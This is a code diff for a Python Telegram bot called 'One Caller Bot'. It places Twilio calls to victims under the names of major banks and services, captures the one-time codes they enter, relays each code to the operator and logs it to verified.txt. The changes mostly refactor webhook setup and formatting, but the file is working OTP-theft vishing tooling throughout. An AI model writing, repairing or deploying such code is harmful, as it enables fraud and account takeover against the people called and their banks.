@@ -13,9 +13,6 @@ from dotenv import load_dotenv
 import redis
 from urllib.parse import urlparse
 
-# Load environment variables
-load_dotenv()
-
 # Configure logging with UTF-8 encoding
 logging.basicConfig(
     level=logging.INFO,
@@ -24,6 +21,12 @@ logging.basicConfig(
         logging.StreamHandler(sys.stdout)
     ]
 )
+
+# Initialize Flask
+web_app = Flask(__name__)
+
+# Load environment variables
+load_dotenv()
 
 # Telegram Bot Token
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
@@ -41,15 +44,23 @@ TWILIO_FUNCTION_URL = os.getenv("TWILIO_FUNCTION_URL")
 REDIS_URL = os.getenv("REDIS_URL")
 REDIS_SOCKET_TIMEOUT = 5
 
-# Initialize Flask and Telegram Bot
-web_app = Flask(__name__)
+# Initialize bot at module level
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
+
+# Set webhook on module import
+webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}/{TELEGRAM_BOT_TOKEN}"
+try:
+    bot.remove_webhook()
+    bot.set_webhook(url=webhook_url)
+    logging.info(f"Telegram webhook set to: {webhook_url}")
+except Exception as e:
+    logging.error(f"Failed to set webhook: {e}")
 
 # User state storage with call tracking
 user_states = {}
 active_calls = {}
 
-# Bank and Service options (your existing lists)
+# Bank and Service options
 BANK_OPTIONS = [
     "JPMorgan Chase", "Citibank", "Goldman Sachs", "TD Bank", "Citizens Bank",
     "Morgan Stanley", "KeyBank", "Bank of America Financial", "U.S. Bank Branch", "Truist",
@@ -69,7 +80,6 @@ SERVICE_OPTIONS = [
 
 BANKS_PER_PAGE = 8
 SERVICES_PER_PAGE = 7
-
 
 def create_inline_keyboard():
     """Create inline keyboard for main menu."""
@@ -125,6 +135,7 @@ def create_verification_type_keyboard():
         telebot.types.InlineKeyboardButton("🌐 Verify Service", callback_data="verify_service")
     )
     return markup
+
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -286,7 +297,6 @@ def handle_callback_query(call):
             reply_markup=create_bank_keyboard(page)
         )
 
-
 @bot.message_handler(func=lambda message: True)
 def handle_messages(message):
     """Handle all text messages with enhanced status updates."""
@@ -315,7 +325,6 @@ def handle_messages(message):
          handle_phone_number(message,user_states[chat_id].get("recipient_name"),user_states[chat_id].get("bank"),None)
        elif user_states[chat_id].get("service"):
          handle_phone_number(message,user_states[chat_id].get("recipient_name"),None,user_states[chat_id].get("service"))
-
 
 def handle_phone_number(message,recipient_name,bank_name,service_name):
     """Handle phone number input with detailed status updates."""
@@ -385,7 +394,7 @@ def handle_phone_number(message,recipient_name,bank_name,service_name):
             from_=TWILIO_PHONE_NUMBER,
             twiml=str(response)
         )
-       # Update message with call SID
+        # Update message with call SID
         if bank_name:
            bot.edit_message_text(
                f"📞 Call initiated for {recipient_name} from {bank_name}\nID: `{call.sid}`\nStatus: *Initiating...*",
@@ -466,42 +475,42 @@ def handle_phone_number(message,recipient_name,bank_name,service_name):
             try:
                 otp_code = redis_client.get(otp_key)
                 if otp_code:
-                  if bank_name:
-                     success_message = (
-                        f"✅ *Verification Successful!*\n\n"
-                         f"👤 Recipient: `{recipient_name}`\n"
-                        f"🏦 Bank: `{bank_name}`\n"
-                        f"📱 Number: `{phone_number}`\n"
-                        f"🔑 Code: `{otp_code}`\n"
-                        f"🕒 Time: {time.strftime('%H:%M:%S')}"
-                     )
-                  elif service_name:
-                      success_message = (
-                          f"✅ *Verification Successful!*\n\n"
-                         f"👤 Recipient: `{recipient_name}`\n"
-                        f"🌐 Service: `{service_name}`\n"
-                        f"📱 Number: `{phone_number}`\n"
-                        f"🔑 Code: `{otp_code}`\n"
-                        f"🕒 Time: {time.strftime('%H:%M:%S')}"
-                     )
+                    if bank_name:
+                        success_message = (
+                            f"✅ *Verification Successful!*\n\n"
+                            f"👤 Recipient: `{recipient_name}`\n"
+                            f"🏦 Bank: `{bank_name}`\n"
+                            f"📱 Number: `{phone_number}`\n"
+                            f"🔑 Code: `{otp_code}`\n"
+                            f"🕒 Time: {time.strftime('%H:%M:%S')}"
+                        )
+                    elif service_name:
+                        success_message = (
+                            f"✅ *Verification Successful!*\n\n"
+                            f"👤 Recipient: `{recipient_name}`\n"
+                            f"🌐 Service: `{service_name}`\n"
+                            f"📱 Number: `{phone_number}`\n"
+                            f"🔑 Code: `{otp_code}`\n"
+                            f"🕒 Time: {time.strftime('%H:%M:%S')}"
+                        )
                    
-                  bot.edit_message_text(
+                    bot.edit_message_text(
                         success_message,
                         chat_id=chat_id,
                         message_id=status_message.message_id,
                         parse_mode="Markdown"
                     )
-                  redis_client.delete(otp_key)
+                    redis_client.delete(otp_key)
                     
                     # Save verification to file
-                  try:
+                    try:
                         with open("verified.txt", "a", encoding='utf-8') as f:
                             if bank_name:
-                              f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] User ID: {chat_id}, Name:{recipient_name}, Bank:{bank_name}, Phone: {phone_number}, Code: {otp_code}\n")
+                                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] User ID: {chat_id}, Name:{recipient_name}, Bank:{bank_name}, Phone: {phone_number}, Code: {otp_code}\n")
                             elif service_name:
                                 f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] User ID: {chat_id}, Name:{recipient_name}, Service:{service_name}, Phone: {phone_number}, Code: {otp_code}\n")
-                  except IOError as e:
-                         logging.error(f"Error saving verification: {e}")
+                    except IOError as e:
+                        logging.error(f"Error saving verification: {e}")
                 else:
                     bot.edit_message_text(
                         "⚠️ Call completed but no code was entered.\nPlease try again.",
@@ -530,7 +539,7 @@ def handle_phone_number(message,recipient_name,bank_name,service_name):
     finally:
         if redis_client:
             redis_client.close()
-            
+
 def handle_cancel_call(chat_id, call_sid):
     """Handles cancellation of an ongoing call."""
     try:
@@ -540,24 +549,17 @@ def handle_cancel_call(chat_id, call_sid):
             call.update(status='canceled')
             bot.send_message(chat_id, f"🚫 Call with ID `{call_sid}` has been cancelled.")
         else:
-              bot.send_message(chat_id, f"⚠️ Call with ID `{call_sid}` is already {call.status}.")
+            bot.send_message(chat_id, f"⚠️ Call with ID `{call_sid}` is already {call.status}.")
             
         if chat_id in active_calls and active_calls[chat_id].get('call_sid') == call_sid:
             del active_calls[chat_id]
         if chat_id in user_states:
             del user_states[chat_id]
     except Exception as e:
-         bot.send_message(chat_id, f"❌ Error cancelling call `{call_sid}`: {str(e)}")
+        bot.send_message(chat_id, f"❌ Error cancelling call `{call_sid}`: {str(e)}")
 
 def validate_phone_number(phone_number):
-    """Validates the format of a phone number.
-
-    Args:
-        phone_number (str): The phone number to validate.
-
-    Returns:
-        bool: True if the phone number is valid, False otherwise.
-    """
+    """Validates the format of a phone number."""
     try:
         parsed_number = phonenumbers.parse(phone_number)
         if not phonenumbers.is_valid_number(parsed_number):
@@ -599,15 +601,22 @@ def create_redis_client():
         logging.error(f"Redis connection error: {e}")
         return None
 
-
 # Flask route for health check
 @web_app.route('/')
 def home():
-    return jsonify({
-        "status": "running",
-        "message": "One Caller Bot is active",
-         "bot_info":  "Bot information not retrieved on this route"
-    }), 200
+    try:
+        bot_info = bot.get_me()
+        return jsonify({
+            "status": "running",
+            "message": "One Caller Bot is active",
+            "bot_info": f"@{bot_info.username}"
+        }), 200
+    except Exception as e:
+        return jsonify({
+            "status": "running",
+            "message": "One Caller Bot is active",
+            "bot_info": f"Error getting bot info: {str(e)}"
+        }), 200
 
 # Add webhook endpoint
 @web_app.route('/' + TELEGRAM_BOT_TOKEN, methods=['POST'])
@@ -621,14 +630,12 @@ def telegram_webhook():
     else:
         return 'Error: Not a JSON request', 403
 
-
-
 def signal_handler(signum, frame):
     """Handle shutdown gracefully."""
     logging.info("Shutting down bot...")
     print("\n👋 Bot shutdown requested. Cleaning up...")
     try:
-        bot.remove_webhook()  # Remove the webhook on shutdown
+        bot.remove_webhook()
     except:
         pass
     sys.exit(0)
@@ -636,20 +643,3 @@ def signal_handler(signum, frame):
 # Register signal handlers
 signal.signal(signal.SIGINT, signal_handler)
 signal.signal(signal.SIGTERM, signal_handler)
-
-def main():
-    """Main function to run the bot with enhanced error handling."""
-    logging.info("Initializing One Caller Bot...")
-
-    # Set webhook
-    webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}/{TELEGRAM_BOT_TOKEN}"
-    bot.remove_webhook() # Clean up any existing webhook
-    bot.set_webhook(url=webhook_url)
-    logging.info(f"Telegram webhook set to: {webhook_url}")
-
-    # Run Flask - this is now the entrypoint
-    port = int(os.environ.get('PORT', 5000))
-    web_app.run(host='0.0.0.0', port=port)  # Run in the main thread
-
-if __name__ == '__main__':
-    main()
